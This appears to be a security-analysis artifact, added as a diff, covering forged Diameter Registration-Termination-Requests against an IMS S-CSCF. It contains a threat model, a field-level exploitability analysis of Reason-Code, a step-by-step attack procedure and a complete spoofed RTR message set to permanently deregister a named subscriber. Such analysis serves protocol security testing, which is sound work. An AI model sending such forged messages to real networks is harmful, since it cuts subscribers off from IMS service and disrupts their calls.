@@ -1,0 +1,122 @@
+**Threat Model:**
+- **Attack Assumption:** A misconfigured S-CSCF exposes its Cx Diameter endpoint to the Internet. The attacker impersonates the HSS role, establishes an unauthenticated Diameter connection to the S-CSCF, and sends a forged `Registration-Termination-Request (RTR)` for a known subscriber identity.
+- **Attacker Capability:** The attacker can only send crafted RTR requests on its own Diameter connection to the victim S-CSCF and receive the corresponding answers. The attacker cannot interfere with legitimate HSS<->S-CSCF signaling, cannot alter radio or bearer-plane state, and has no privileged IMS serving role beyond the spoofed HSS connection accepted by the target.
+
+**Exploitability Analysis:**
+`Deregistration-Reason.Reason-Code` is independently security-relevant under this threat model because it is not merely descriptive text: 3GPP explicitly defines it as the value that determines what action the S-CSCF shall perform for network-initiated IMS de-registration.
+
+The message direction is HSS->S-CSCF on Cx, and the target field sits at:
+
+- `Registration-Termination-Request`
+  - `Deregistration-Reason`
+    - `Reason-Code`
+
+`Reason-Code` is a mandatory enumerated AVP inside a mandatory grouped AVP. The S-CSCF processes it as authoritative procedural input. Per the supplied evidence, the S-CSCF does not treat it as logging metadata; instead, different values select different de-registration semantics:
+
+- `PERMANENT_TERMINATION (0)`: no S-CSCF assignment should remain and no new one should be assigned.
+- `NEW_SERVER_ASSIGNED (1)`: a new S-CSCF has already been allocated; the current S-CSCF removes all stored information for the targeted identities.
+- `SERVER_CHANGE (2)`: de-registration is used to force new S-CSCF selection and user re-registration.
+- `REMOVE_S-CSCF (3)`: remove S-CSCF assignment for targeted unregistered / kept-profile identities.
+
+This matters beyond the generic fact that a forged RTR can deregister a subscriber. Holding the subscriber identity selection constant and varying only `Reason-Code` changes the resulting state transition and recovery path:
+
+- With `SERVER_CHANGE`, the victim S-CSCF is induced to trigger network-initiated de-registration intended to force re-registration and new server selection.
+- With `NEW_SERVER_ASSIGNED`, the current S-CSCF removes its local state under the semantic that another server already owns the user.
+- With `PERMANENT_TERMINATION`, the de-registration carries stronger disablement semantics tied to no-further-assignment behavior, making recovery materially harder than simple re-registration.
+- With `REMOVE_S-CSCF`, the action is narrower and tied to removal of stored serving assignment for applicable identities.
+
+Those are distinct, standards-backed operational effects attributable to the field itself. The field therefore influences stored IMS registration/service state, later user re-registration behavior, possible server reassignment behavior, and service continuity. The downstream consequences can include IMS registration loss, forced re-registration, removal of service-profile bindings, third-party REGISTER side effects to ASs, and release/interruption of active IMS sessions.
+
+Recovery is not uniform. Some bad state may be corrected by later legitimate registration or reassignment, especially for `SERVER_CHANGE` and `NEW_SERVER_ASSIGNED`. But the stronger `PERMANENT_TERMINATION` semantic is not just a transient hint; it represents a materially different de-registration meaning with weaker automatic recovery. That difference is precisely field-specific.
+
+Accordingly, this field meets the EXPLOITABLE criteria: the attacker can send the forged enclosing request under the fixed model; the receiver processes `Reason-Code` as meaningful input; the field value changes state transition and later behavior; and the effect is distinct and security-relevant.
+
+**Attack Procedure:**
+1. Establish a Diameter connection to the target S-CSCF while impersonating an HSS peer.
+2. Craft a minimal but coherent `Registration-Termination-Request (RTR)` with mandatory AVPs only, plus a `Public-Identity` to precisely target one IMS public identity.
+3. Set the target field `Deregistration-Reason.Reason-Code` to a malicious test value. A strong field-specific test is `PERMANENT_TERMINATION (0)` because it exercises the strongest de-registration semantic and the least self-healing recovery path.
+4. Keep identity targeting constant across tests; vary only `Reason-Code` if comparing field-specific behavior.
+5. Send the RTR and observe successful acceptance via the corresponding RTA plus subscriber-impacting behavior such as IMS deregistration, session disruption, or failed/changed re-registration path.
+
+Only mandatory and coherence-related AVPs are included below; unrelated AVPs are excluded.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 304,
+    "application_id": 16777216,
+    "flags": {
+      "request": true,
+      "proxiable": true,
+      "error": false,
+      "retransmitted": false
+    },
+    "hop_by_hop_id": "0x4a3b2c1d",
+    "end_to_end_id": "0x7e6f5a4b"
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker-hss.example.net;1710000001;cx-rtr-001"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "scscf1.ims.example.com"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.example.com"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "imsi001010123456789@ims.example.com"
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:alice@ims.example.com"
+    },
+    {
+      "avp_name": "Deregistration-Reason",
+      "grouped_avp": [
+        {
+          "avp_name": "Reason-Code",
+          "avp_value": 0
+        },
+        {
+          "avp_name": "Reason-Info",
+          "avp_value": "subscription terminated"
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
